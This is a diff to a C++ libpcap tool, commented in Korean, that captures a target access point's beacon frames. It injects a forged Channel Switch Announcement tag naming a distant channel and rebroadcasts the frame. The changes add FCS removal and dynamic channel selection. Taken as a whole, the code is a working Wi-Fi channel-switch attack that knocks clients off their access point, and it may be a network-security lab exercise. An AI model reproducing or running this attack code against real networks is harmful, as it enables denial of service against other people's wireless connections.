@@ -6,12 +6,15 @@
 #include <chrono>
 #include <thread>
 #include <arpa/inet.h>
+#include "radiotap.h"
+#include "dot11.h"
 
 using namespace std;
 
-const int MIN_80211_HDR = 24;          // Dot11FrameHeader 길이
+#define IEEE80211_RADIOTAP_F_FCS 0x10  // Radiotap flags: FCS present
+
+const int MIN_80211_HDR = 24;          // Dot11_frameHeader 길이
 const int FIXED_PARAMS_LEN = 12;      // BeaconFixedParameters 길이
-const uint8_t CSA_TAG[5] = {0x25, 0x03, 0x01, 0x0b, 0x03};  // CSA 태그
 const unsigned char BROADCAST_MAC[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
 
 /*
@@ -63,6 +66,61 @@ bool capture_beacon(pcap_t *handle, const unsigned char *ap_mac, vector<uint8_t>
         dot11_frame.assign(dot11, dot11 + header->caplen - rtap_len);
         return true;
     }
+
+    return false;
+}
+
+
+void remove_fcs_if_present(vector<uint8_t>& radiotap_hdr, vector<uint8_t>& dot11_frame) {
+    if (radiotap_hdr.size() < 8)
+        return;
+
+    // Radiotap 헤더 길이
+    uint16_t rtap_len = radiotap_hdr[2] | (radiotap_hdr[3] << 8);
+    if (radiotap_hdr.size() < rtap_len)
+        return;
+
+    // present 필드 (4바이트)
+    uint32_t present = radiotap_hdr[4] | (radiotap_hdr[5] << 8) | (radiotap_hdr[6] << 16) | (radiotap_hdr[7] << 24);
+    
+    size_t offset = 8;
+    // TSFT (bit 0)이 있으면 8바이트 건너뛰기
+    if (present & (1 << 0)) {
+        offset += 8;
+    }
+    // Flags (bit 1) 필드가 있으면 그 위치를 저장
+    size_t flags_index = 0;
+    bool has_flags = false;
+    if (present & (1 << 1)) {
+        flags_index = offset;
+        has_flags = true;
+        offset += 1;
+    }
+    
+    if (has_flags) {
+        uint8_t flags = radiotap_hdr[flags_index];
+        if (flags & IEEE80211_RADIOTAP_F_FCS) {
+            // dot11_frame의 마지막 4바이트(FCS)가 있다면 제거
+            if (dot11_frame.size() >= 4)
+                dot11_frame.resize(dot11_frame.size() - 4);
+            // Radiotap 헤더의 FCS 플래그 클리어
+            radiotap_hdr[flags_index] = flags & ~(IEEE80211_RADIOTAP_F_FCS);
+        }
+    }
+}
+
+uint8_t find_current_channel(const vector<uint8_t>& dot11_frame) {
+    size_t offset = MIN_80211_HDR + FIXED_PARAMS_LEN;
+    while (offset + 2 <= dot11_frame.size()) {
+        uint8_t tag_id = dot11_frame[offset];
+        uint8_t tag_len = dot11_frame[offset + 1];
+        if (offset + 2 + tag_len > dot11_frame.size()) break;
+        if (tag_id == 3 && tag_len == 1) { // DS Parameter Set
+            return dot11_frame[offset + 2];
+        }
+        offset += 2 + tag_len;
+    }
+    return 0;
 }
 
 /*
@@ -76,6 +134,12 @@ vector<uint8_t> modify_beacon_frame(const vector<uint8_t>& dot11_frame, const un
         return vector<uint8_t>();
     }
 
+    // 동적 채널 변경: DS Parameter Set(태그 id 3)에서 현재 채널 읽기
+    uint8_t current_channel = find_current_channel(dot11_frame);
+    // "가장 먼 채널" 결정 (예: 현재 채널이 6보다 크면 1, 아니면 11)
+    uint8_t new_channel = (current_channel > 6) ? 1 : 11;
+
+
     const uint8_t* original_tags_ptr = dot11_frame.data() + fixed_offset;
     int original_tags_len = dot11_frame.size() - fixed_offset;
 
@@ -84,13 +148,22 @@ vector<uint8_t> modify_beacon_frame(const vector<uint8_t>& dot11_frame, const un
     while (insertion_point + 2 <= original_tags_len) {
         uint8_t tag_num = original_tags_ptr[insertion_point];
         uint8_t tag_len = original_tags_ptr[insertion_point + 1];
-        if (tag_num > CSA_TAG[0]) break;
+        if (tag_num > 0x25) break;
         insertion_point += 2 + tag_len;
     }
 
     vector<uint8_t> channel_switch_tags;
     channel_switch_tags.insert(channel_switch_tags.end(), original_tags_ptr, original_tags_ptr + insertion_point);
-    channel_switch_tags.insert(channel_switch_tags.end(), CSA_TAG, CSA_TAG + sizeof(CSA_TAG));
+
+    // CSA 태그 구성 (구조체 사용 – dot11.h에 정의됨)
+    CSA_Tag csa;
+    csa.tag = 0x25;
+    csa.len = 3;
+    csa.mode = 1;
+    csa.new_channel = new_channel;
+    csa.count = 3;  // 초기 카운트 값
+
+    channel_switch_tags.insert(channel_switch_tags.end(), reinterpret_cast<uint8_t*>(&csa), reinterpret_cast<uint8_t*>(&csa) + sizeof(CSA_Tag));
     channel_switch_tags.insert(channel_switch_tags.end(), original_tags_ptr + insertion_point, original_tags_ptr + original_tags_len);
 
     vector<uint8_t> new_dot11;
@@ -158,6 +231,9 @@ int main(int argc, char* argv[]) {
         pcap_close(handle);
         return 1;
     }
+
+    // Radiotap 헤더의 flags에 FCS 플래그가 있으면 dot11_frame에서 FCS 4바이트 제거 후 플래그 클리어
+    remove_fcs_if_present(radiotap_hdr, new_dot11);
 
     vector<uint8_t> final_packet;
     final_packet.insert(final_packet.end(), radiotap_hdr.begin(), radiotap_hdr.end());
